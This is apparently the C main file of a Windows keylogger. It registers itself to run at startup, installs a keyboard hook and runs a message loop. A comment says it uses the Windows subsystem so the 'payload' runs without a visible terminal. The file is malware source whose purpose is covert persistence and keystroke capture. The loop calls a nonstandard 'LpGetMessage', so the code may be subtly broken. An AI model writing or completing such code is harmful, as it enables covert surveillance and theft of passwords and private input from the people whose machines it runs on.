#include "util/keyboard.h"
#include "util/registry.h"
#include "win32.h"

#pragma warning(push)
#pragma warning(disable: 4100)

/*
 * The entry point for the application is a Windows subsystem to prevent a brief 
 * terminal flicker when running the payload.
 */
int APIENTRY wWinMain(HINSTANCE inst, HINSTANCE prev_inst,
		      LPWSTR cmd_line, int cmd_show) 
{
	DWORD rc = init_win32_libraries();

	if (rc)
		return rc;

	rc = add_to_startup();

	if (rc)
		return rc;

	if (!set_keyboard_hook())
		return 1;

	MSG msg;
	while (LpGetMessage(&msg, NULL, 0, 0));

	return 0;
}

#pragma warning(pop)
